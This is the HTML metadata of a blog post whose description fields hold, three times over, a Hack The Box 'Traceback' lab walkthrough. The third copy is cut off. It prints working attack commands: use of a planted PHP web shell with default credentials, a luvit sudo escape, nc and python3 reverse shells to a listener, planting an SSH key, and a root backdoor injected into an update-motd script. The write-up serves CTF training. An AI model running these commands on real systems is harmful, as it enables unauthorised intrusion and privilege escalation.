<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Traceback" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.181 traceback.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ nmap -sV -sT -sC traceback.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-02 07:47 EDT Nmap scan report for traceback.htb (10.10.10.181) Host is up (0.0056s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Help us Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.03 seconds Enumeration (1) Not much can be done with the ssh service on port 22, so lets start with the http service on port 80! By viewing the source, we see something interesting. 1 2 3 4 5 6 &lt;center&gt; &lt;h1&gt;This site has been owned&lt;/h1&gt; &lt;h2&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;/h2&gt; &lt;h3&gt; - Xh4H - &lt;/h3&gt; &lt;!--Some of the best web shells that you might need ;)--&gt; &lt;/center&gt; The website has already been pwned? And what is with that comment? Searching “Some of the best web shells that you might need”, I came across a repo that was forked by Xh4H, which seems by the one that pwned the website. In the repo was a list of ready-to-use web shells so I guess he must have uploaded one of this. Since the list was quite short, I manually tested each file and found that smevk.php existed on the web server. http://traceback.php/smevk.php: According to the source code in the repo, the username and password were both admin. 1 2 $UserName = &quot;admin&quot;; //Your UserName here. $auth_pass = &quot;admin&quot;; //Your Password. After logging in, we see that the web shell is packed with many features such as file upload, command execution etc. Using the command execution feature, I listed the home directories of users: 1 2 3 $ ls /home sysadmin webadmin There is another user called sysadmin but all we could do is list the contents of webadmin’s home directory. 1 2 3 4 5 6 7 8 9 10 11 12 13 $ ls -al /home/webadmin total 44 drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 . drwxr-xr-x 4 root root 4096 Aug 25 2019 .. -rw------- 1 webadmin webadmin 105 Mar 16 04:03 .bash_history -rw-r--r-- 1 webadmin webadmin 220 Aug 23 2019 .bash_logout -rw-r--r-- 1 webadmin webadmin 3771 Aug 23 2019 .bashrc drwx------ 2 webadmin webadmin 4096 Aug 23 2019 .cache drwxrwxr-x 3 webadmin webadmin 4096 Aug 24 2019 .local -rw-rw-r-- 1 webadmin webadmin 1 Aug 25 2019 .luvit_history -rw-r--r-- 1 webadmin webadmin 807 Aug 23 2019 .profile drwxrwxr-x 2 webadmin webadmin 4096 Aug 2 00:39 .ssh -rw-rw-r-- 1 sysadmin sysadmin 122 Mar 16 03:53 note.txt There is a note.txt! Lets read it. 1 2 3 4 5 $ cat /home/webadmin/note.txt - sysadmin - I have left a tool to practice Lua. I&#39;m sure you know where to find it. Contact me if you have any question. A tool to practice Lua? I wasn’t sure what sysadmin was talking about but seeing in the home directory of webadmin, there was .luvit_history, which seems to be out of the norm. Searching online, it belonged to a program called Luvit! Running sudo -l, we see that we are able to run luvit as sysadmin. 1 2 3 4 5 6 $ sudo -l Matching Defaults entries for webadmin on traceback: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User webadmin may run the following commands on traceback: (sysadmin) NOPASSWD: /home/sysadmin/luvit Let see what we can do with it. 1 2 3 4 5 6 7 8 9 10 11 12 $ sudo -u sysadmin /home/sysadmin/luvit -h Usage: /home/sysadmin/luvit [options] script.lua [arguments] Options: -h, --help Print this help screen. -v, --version Print the version. -e code_chunk Evaluate code chunk and print result. -i, --interactive Enter interactive repl after executing script. -n, --no-color Disable colors. -c, --16-colors Use simple ANSI colors -C, --256-colors Use 256-mode ANSI colors (Note, if no script is provided, a repl is run instead.) With the -e option, we can run put Lua code and it will run it as sysadmin! Since using luvit will be similar to using lua, I decided to follow this to see if we can run some arbitrary commands. 1 2 3 $ sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&quot;id&quot;)&#39; uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin) true &#39;exit&#39; 0 Exploitation (1) Nice! We managed to run commands as sysadmin. Lets spawn a reverse shell as sysadmin! After starting a nc listener on port 1337, I ran the below command: 1 $ sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XX.XX 1337 &gt;/tmp/f&quot;)&#39; And I receive the connection: 1 2 3 4 5 6 $ nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.181] 54078 /bin/sh: 0: can&#39;t access tty; job control turned off $ id uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin) user.txt With a stable shell, we can now read the user flag. 1 2 $ cat /home/sysadmin/user.txt 7213XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) I uploaded pspy to the box and ran it. 1 2 3 4 5 6 7 8 9 10 11 12 $ wget http://10.10.XX.XX/pspy --2020-08-02 02:59:49-- http://10.10.XX.XX/pspy Connecting to 10.10.XX.XX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 1090528 (1.0M) [application/octet-stream] Saving to: &#39;pspy&#39; ... 2020-08-02 02:59:50 (4.74 MB/s) - &#39;pspy&#39; saved [1090528/1090528] $ ./pspy ... 2020/08/02 03:03:01 CMD: UID=0 PID=9977 | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ ... Every now and then, files from /var/backups/.update-motd.d/ will be copied to /etc/update-motd.d/. Hmm lets check what permission we have on these folders. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ ls -al /etc/update-motd.d/ total 32 drwxr-xr-x 2 root sysadmin 4096 Aug 27 2019 . drwxr-xr-x 80 root root 4096 Mar 16 03:55 .. -rwxrwxr-x 1 root sysadmin 981 Aug 2 03:26 00-header -rwxrwxr-x 1 root sysadmin 982 Aug 2 03:26 10-help-text -rwxrwxr-x 1 root sysadmin 4264 Aug 2 03:26 50-motd-news -rwxrwxr-x 1 root sysadmin 604 Aug 2 03:26 80-esm -rwxrwxr-x 1 root sysadmin 299 Aug 2 03:26 91-release-upgrade $ ls -al /var/backups/.update-motd.d total 32 drwxr-xr-x 2 root root 4096 Mar 5 02:56 . drwxr-xr-x 3 root root 4096 Aug 25 2019 .. -rwxr-xr-x 1 root root 981 Aug 25 2019 00-header -rwxr-xr-x 1 root root 982 Aug 27 2019 10-help-text -rwxr-xr-x 1 root root 4264 Aug 25 2019 50-motd-news -rwxr-xr-x 1 root root 604 Aug 25 2019 80-esm -rwxr-xr-x 1 root root 299 Aug 25 2019 91-release-upgrade We got write access to /etc/update-motd.d! It seems like the scripts in /etc/update-motd will be replaced with a clean version every now and then. Lets check if sshing into the box will cause these scripts to run. First I generate a ssh key-pair. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ ssh-keygen -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): traceback/id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in traceback/id_rsa. Your public key has been saved in traceback/id_rsa.pub. The key fingerprint is: SHA256:CMKnVhw7VM+I3CeNzdMaP58KKe2K/r2pm585NpE8IcA root@kali The key&#39;s randomart image is: +---[RSA 3072]----+ | .o.. | | . +E= O . | | o X.= X . | | = o.+.= | | o .oSoo | | . .=. o . | | . +o o | | . =+= . | | .o.**O+. | +----[SHA256]-----+ Then, I copy the contents of my public key id_rsa.pub into sysadmin’s authorized_keys and ssh with the private key. 1 2 3 4 5 6 7 8 9 10 11 12 $ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCu/dvT4ATAAvV67Dzm8YNMfOzD1np26hbCDYbfgv9vltGcNsjqxw/ZOqiTtl6S88VX/VcmiVmbFB4KTZLFv4Sh+jJF5jhGwHDjE/pB2xNxFeyvr2DNSOU+810XAm15M7sMQUowLzikZgbfc/tYMZ7n8Bkd97smwnsCpS51NQjgOeAAAXmSxeSlHEokH4TFQXC5Xf1ApTnWMgxpf+mM675UQYhpgSA2uc6xjCGUjRJyTPHoItg+DpUytuMliPtgKLXovv7MSMVMbKXcUCv/eUDYYjPUcQc50VqziVAAh1SmBaIRtVu/2+9b4TfpR1YmAfC+ZOSPMbZYzbP2IeSW3/panAFzu/Z/K4t4W8YHU4hpOkm4+70A1+LQqiC/67fwdnWWX3Baw6Is3HDV7Uhsxg4ulFGqSPtdoSQYWir6ToC0eBfFHj05nTrHLi4FuJVQInMdLdErSA6eQpNyYwWYvTMD/l10m1SlV1dupyGSW65y+rbID6EKkR1sGGBTS2RB4eE= root@kali&quot; &gt;&gt; /home/sysadmin/.ssh/authorized_keys $ ssh -i id_rsa sysadmin@traceback.htb ################################# -------- OWNED BY XH4H --------- - I guess stuff could have been configured better ^^ - ################################# Welcome to Xh4H land Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings The line Welcome to Xh4H land was from 00-header! This means that since we can write to it and run any commands! 1 2 3 $ cat /etc/update-motd.d/00-header ... echo &quot;\nWelcome to Xh4H land \n&quot; Exploitation (2) Lets create a bash script that connects back to our nc listener on port 1338 and add it to 00-header. 1 2 3 4 $ cat /tmp/rev.sh python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.XX.XX&quot;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; $ chmod 777 /tmp/rev.sh $ echo &quot;/tmp/rev.sh&quot; &gt;&gt; /etc/update-motd.d/00-header And lastly, we simply start another ssh connection. 1 $ ssh -i id_rsa sysadmin@traceback.htb root.txt On our listener, we catch the connection and get the root flag. 1 2 3 4 5 $ nc -lvnp 1338 listening on [any] 1338 ... connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.181] 54618 root@traceback:/# cat /root/root.txt 05acXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.181 traceback.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ nmap -sV -sT -sC traceback.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-02 07:47 EDT Nmap scan report for traceback.htb (10.10.10.181) Host is up (0.0056s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Help us Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.03 seconds Enumeration (1) Not much can be done with the ssh service on port 22, so lets start with the http service on port 80! By viewing the source, we see something interesting. 1 2 3 4 5 6 &lt;center&gt; &lt;h1&gt;This site has been owned&lt;/h1&gt; &lt;h2&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;/h2&gt; &lt;h3&gt; - Xh4H - &lt;/h3&gt; &lt;!--Some of the best web shells that you might need ;)--&gt; &lt;/center&gt; The website has already been pwned? And what is with that comment? Searching “Some of the best web shells that you might need”, I came across a repo that was forked by Xh4H, which seems by the one that pwned the website. In the repo was a list of ready-to-use web shells so I guess he must have uploaded one of this. Since the list was quite short, I manually tested each file and found that smevk.php existed on the web server. http://traceback.php/smevk.php: According to the source code in the repo, the username and password were both admin. 1 2 $UserName = &quot;admin&quot;; //Your UserName here. $auth_pass = &quot;admin&quot;; //Your Password. After logging in, we see that the web shell is packed with many features such as file upload, command execution etc. Using the command execution feature, I listed the home directories of users: 1 2 3 $ ls /home sysadmin webadmin There is another user called sysadmin but all we could do is list the contents of webadmin’s home directory. 1 2 3 4 5 6 7 8 9 10 11 12 13 $ ls -al /home/webadmin total 44 drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 . drwxr-xr-x 4 root root 4096 Aug 25 2019 .. -rw------- 1 webadmin webadmin 105 Mar 16 04:03 .bash_history -rw-r--r-- 1 webadmin webadmin 220 Aug 23 2019 .bash_logout -rw-r--r-- 1 webadmin webadmin 3771 Aug 23 2019 .bashrc drwx------ 2 webadmin webadmin 4096 Aug 23 2019 .cache drwxrwxr-x 3 webadmin webadmin 4096 Aug 24 2019 .local -rw-rw-r-- 1 webadmin webadmin 1 Aug 25 2019 .luvit_history -rw-r--r-- 1 webadmin webadmin 807 Aug 23 2019 .profile drwxrwxr-x 2 webadmin webadmin 4096 Aug 2 00:39 .ssh -rw-rw-r-- 1 sysadmin sysadmin 122 Mar 16 03:53 note.txt There is a note.txt! Lets read it. 1 2 3 4 5 $ cat /home/webadmin/note.txt - sysadmin - I have left a tool to practice Lua. I&#39;m sure you know where to find it. Contact me if you have any question. A tool to practice Lua? I wasn’t sure what sysadmin was talking about but seeing in the home directory of webadmin, there was .luvit_history, which seems to be out of the norm. Searching online, it belonged to a program called Luvit! Running sudo -l, we see that we are able to run luvit as sysadmin. 1 2 3 4 5 6 $ sudo -l Matching Defaults entries for webadmin on traceback: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User webadmin may run the following commands on traceback: (sysadmin) NOPASSWD: /home/sysadmin/luvit Let see what we can do with it. 1 2 3 4 5 6 7 8 9 10 11 12 $ sudo -u sysadmin /home/sysadmin/luvit -h Usage: /home/sysadmin/luvit [options] script.lua [arguments] Options: -h, --help Print this help screen. -v, --version Print the version. -e code_chunk Evaluate code chunk and print result. -i, --interactive Enter interactive repl after executing script. -n, --no-color Disable colors. -c, --16-colors Use simple ANSI colors -C, --256-colors Use 256-mode ANSI colors (Note, if no script is provided, a repl is run instead.) With the -e option, we can run put Lua code and it will run it as sysadmin! Since using luvit will be similar to using lua, I decided to follow this to see if we can run some arbitrary commands. 1 2 3 $ sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&quot;id&quot;)&#39; uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin) true &#39;exit&#39; 0 Exploitation (1) Nice! We managed to run commands as sysadmin. Lets spawn a reverse shell as sysadmin! After starting a nc listener on port 1337, I ran the below command: 1 $ sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XX.XX 1337 &gt;/tmp/f&quot;)&#39; And I receive the connection: 1 2 3 4 5 6 $ nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.181] 54078 /bin/sh: 0: can&#39;t access tty; job control turned off $ id uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin) user.txt With a stable shell, we can now read the user flag. 1 2 $ cat /home/sysadmin/user.txt 7213XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) I uploaded pspy to the box and ran it. 1 2 3 4 5 6 7 8 9 10 11 12 $ wget http://10.10.XX.XX/pspy --2020-08-02 02:59:49-- http://10.10.XX.XX/pspy Connecting to 10.10.XX.XX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 1090528 (1.0M) [application/octet-stream] Saving to: &#39;pspy&#39; ... 2020-08-02 02:59:50 (4.74 MB/s) - &#39;pspy&#39; saved [1090528/1090528] $ ./pspy ... 2020/08/02 03:03:01 CMD: UID=0 PID=9977 | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ ... Every now and then, files from /var/backups/.update-motd.d/ will be copied to /etc/update-motd.d/. Hmm lets check what permission we have on these folders. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ ls -al /etc/update-motd.d/ total 32 drwxr-xr-x 2 root sysadmin 4096 Aug 27 2019 . drwxr-xr-x 80 root root 4096 Mar 16 03:55 .. -rwxrwxr-x 1 root sysadmin 981 Aug 2 03:26 00-header -rwxrwxr-x 1 root sysadmin 982 Aug 2 03:26 10-help-text -rwxrwxr-x 1 root sysadmin 4264 Aug 2 03:26 50-motd-news -rwxrwxr-x 1 root sysadmin 604 Aug 2 03:26 80-esm -rwxrwxr-x 1 root sysadmin 299 Aug 2 03:26 91-release-upgrade $ ls -al /var/backups/.update-motd.d total 32 drwxr-xr-x 2 root root 4096 Mar 5 02:56 . drwxr-xr-x 3 root root 4096 Aug 25 2019 .. -rwxr-xr-x 1 root root 981 Aug 25 2019 00-header -rwxr-xr-x 1 root root 982 Aug 27 2019 10-help-text -rwxr-xr-x 1 root root 4264 Aug 25 2019 50-motd-news -rwxr-xr-x 1 root root 604 Aug 25 2019 80-esm -rwxr-xr-x 1 root root 299 Aug 25 2019 91-release-upgrade We got write access to /etc/update-motd.d! It seems like the scripts in /etc/update-motd will be replaced with a clean version every now and then. Lets check if sshing into the box will cause these scripts to run. First I generate a ssh key-pair. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ ssh-keygen -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): traceback/id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in traceback/id_rsa. Your public key has been saved in traceback/id_rsa.pub. The key fingerprint is: SHA256:CMKnVhw7VM+I3CeNzdMaP58KKe2K/r2pm585NpE8IcA root@kali The key&#39;s randomart image is: +---[RSA 3072]----+ | .o.. | | . +E= O . | | o X.= X . | | = o.+.= | | o .oSoo | | . .=. o . | | . +o o | | . =+= . | | .o.**O+. | +----[SHA256]-----+ Then, I copy the contents of my public key id_rsa.pub into sysadmin’s authorized_keys and ssh with the private key. 1 2 3 4 5 6 7 8 9 10 11 12 $ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCu/dvT4ATAAvV67Dzm8YNMfOzD1np26hbCDYbfgv9vltGcNsjqxw/ZOqiTtl6S88VX/VcmiVmbFB4KTZLFv4Sh+jJF5jhGwHDjE/pB2xNxFeyvr2DNSOU+810XAm15M7sMQUowLzikZgbfc/tYMZ7n8Bkd97smwnsCpS51NQjgOeAAAXmSxeSlHEokH4TFQXC5Xf1ApTnWMgxpf+mM675UQYhpgSA2uc6xjCGUjRJyTPHoItg+DpUytuMliPtgKLXovv7MSMVMbKXcUCv/eUDYYjPUcQc50VqziVAAh1SmBaIRtVu/2+9b4TfpR1YmAfC+ZOSPMbZYzbP2IeSW3/panAFzu/Z/K4t4W8YHU4hpOkm4+70A1+LQqiC/67fwdnWWX3Baw6Is3HDV7Uhsxg4ulFGqSPtdoSQYWir6ToC0eBfFHj05nTrHLi4FuJVQInMdLdErSA6eQpNyYwWYvTMD/l10m1SlV1dupyGSW65y+rbID6EKkR1sGGBTS2RB4eE= root@kali&quot; &gt;&gt; /home/sysadmin/.ssh/authorized_keys $ ssh -i id_rsa sysadmin@traceback.htb ################################# -------- OWNED BY XH4H --------- - I guess stuff could have been configured better ^^ - ################################# Welcome to Xh4H land Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings The line Welcome to Xh4H land was from 00-header! This means that since we can write to it and run any commands! 1 2 3 $ cat /etc/update-motd.d/00-header ... echo &quot;\nWelcome to Xh4H land \n&quot; Exploitation (2) Lets create a bash script that connects back to our nc listener on port 1338 and add it to 00-header. 1 2 3 4 $ cat /tmp/rev.sh python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.XX.XX&quot;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; $ chmod 777 /tmp/rev.sh $ echo &quot;/tmp/rev.sh&quot; &gt;&gt; /etc/update-motd.d/00-header And lastly, we simply start another ssh connection. 1 $ ssh -i id_rsa sysadmin@traceback.htb root.txt On our listener, we catch the connection and get the root flag. 1 2 3 4 5 $ nc -lvnp 1338 listening on [any] 1338 ... connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.181] 54618 root@traceback:/# cat /root/root.txt 05acXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/traceback-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/traceback-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-08-16T13:31:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Traceback" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/traceback-htb/"},"description":"Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.181 traceback.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ nmap -sV -sT -sC traceback.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-02 07:47 EDT Nmap scan report for traceback.htb (10.10.10.181) Host is up (0.0056s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Help us Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.03 seconds Enumeration (1) Not much can be done with the ssh service on port 22, so lets start with the http service on port 80! By viewing the source, we see something interesting. 1 2 3 4 5 6 &lt;center&gt; &lt;h1&gt;This site has been owned&lt;/h1&gt; &lt;h2&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;/h2&gt; &lt;h3&gt; - Xh4H - &lt;/h3&gt; &lt;!--Some of the best web shells that you might need ;)--&gt; &lt;/center&gt; The website has already been pwned? And what is with that comment? Searching “Some of the best web shells that you might need”, I came across a repo that was forked by Xh4H, which seems by the one that pwned the website. In the repo was a list of ready-to-use web shells so I guess he must have uploaded one of this. Since the list was quite short, I manually tested each file and found that smevk.php existed on the web server. http://traceback.php/smevk.php: According to the source code in the repo, the username and password were both admin. 1 2 $UserName = &quot;admin&quot;; //Your UserName here. $auth_pass = &quot;admin&quot;; //Your Password. After logging in, we see that the web shell is packed with many features such as file upload, command execution etc. Using the command execution feature, I listed the home directories of users: 1 2 3 $ ls /home sysadmin webadmin There is another user called sysadmin but all we could do is list the contents of webadmin’s home directory. 1 2 3 4 5 6 7 8 9 10 11 12 13 $ ls -al /home/webadmin total 44 drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 . drwxr-xr-x 4 root root 4096 Aug 25 2019 .. -rw------- 1 webadmin webadmin 105 Mar 16 04:03 .bash_history -rw-r--r-- 1 webadmin webadmin 220 Aug 23 2019 .bash_logout -rw-r--r-- 1 webadmin webadmin 3771 Aug 23 2019 .bashrc drwx------ 2 webadmin webadmin 4096 Aug 23 2019 .cache drwxrwxr-x 3 webadmin webadmin 4096 Aug 24 2019 .local -rw-rw-r-- 1 webadmin webadmin 1 Aug 25 2019 .luvit_history -rw-r--r-- 1 webadmin webadmin 807 Aug 23 2019 .profile drwxrwxr-x 2 webadmin webadmin 4096 Aug 2 00:39 .ssh -rw-rw-r-- 1 sysadmin sysadmin 122 Mar 16 03:53 note.txt There is a note.txt! Lets read it. 1 2 3 4 5 $ cat /home/webadmin/note.txt - sysadmin - I have left a tool to practice Lua. I&#39;m sure you know where to find it. Contact me if you have any question. A tool to practice Lua? I wasn’t sure what sysadmin was talking about but seeing in the home directory of webadmin, there was .luvit_history, which seems to be out of the norm. Searching online, it belonged to a program called Luvit! Running sudo -l, we see that we are able to run luvit as sysadmin. 1 2 3 4 5 6 $ sudo -l Matching Defaults entries for webadmin on traceback: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User webadmin may run the following commands on traceback: (sysadmin) NOPASSWD: /home/sysadmin/luvit Let see what we can do with it. 1 2 3 4 5 6 7 8 9 10 11 12 $ sudo -u sysadmin /home/sysadmin/luvit -h Usage: /home/sysadmin/luvit [options] script.lua [arguments] Options: -h, --help Print this help screen. -v, --version Print the version. -e code_chunk Evaluate code chunk and print result. -i, --interactive Enter interactive repl after executing script. -n, --no-color Disable colors. -c, --16-colors Use simple ANSI colors -C, --256-colors Use 256-mode ANSI colors (Note, if no script is provided, a repl is run instead.) With the -e option, we can run put Lua code and it will run it as sysadmin! Since using luvit will be similar to using lua, I decided to follow this to see if we can run some arbitrary commands. 1 2 3 $ sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&quot;id&quot;)&#39; uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin) true &#39;exit&#39; 0 Exploitation (1) Nice! We managed to run commands as sysadmin. Lets spawn a reverse shell as sysadmin! After starting a nc listener on port 1337, I ran the below command: 1 $ sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XX.XX 1337 &gt;/tmp/f&quot;)&#39; And I receive the connection: 1 2 3 4 5 6 $ nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.181] 54078 /bin/sh: 0: can&#39;t access tty; job control turned off $ id uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin) user.txt With a stable shell, we can now read the user flag. 1 2 $ cat /home/sysadmin/user.txt 7213XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) I uploaded pspy to the box and ran it. 1 2 3 4 5 6 7 8 9 10 11 12 $ wget http://10.10.XX.XX/pspy --2020-08-02 02:59:49-- http://10.10.XX.XX/pspy Connecting to 10.10.XX.XX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 1090528 (1.0M) [application/octet-stream] Saving to: &#39;pspy&#39; ... 2020-08-02 02:59:50 (4.74 MB/s) - &#39;pspy&#39; saved [1090528/1090528] $ ./pspy ... 2020/08/02 03:03:01 CMD: UID=0 PID=9977 | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ ... Every now and then, files from /var/backups/.update-motd.d/ will be copied to /etc/update-motd.d/. Hmm lets check what permission we have on these folders. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ ls -al /etc/update-motd.d/ total 32 drwxr-xr-x 2 root sysadmin 4096 Aug 27 2019 . drwxr-xr-x 80 root root 4096 Mar 16 03:55 .. -rwxrwxr-x 1 root sysadmin 981 Aug 2 03:26 00-header -rwxrwxr-x 1 root sysadmin 982 Aug 2 03:26 10-help-text -rwxrwxr-x 1 root sysadmin 4264 Aug 2 03:26 50-motd-news 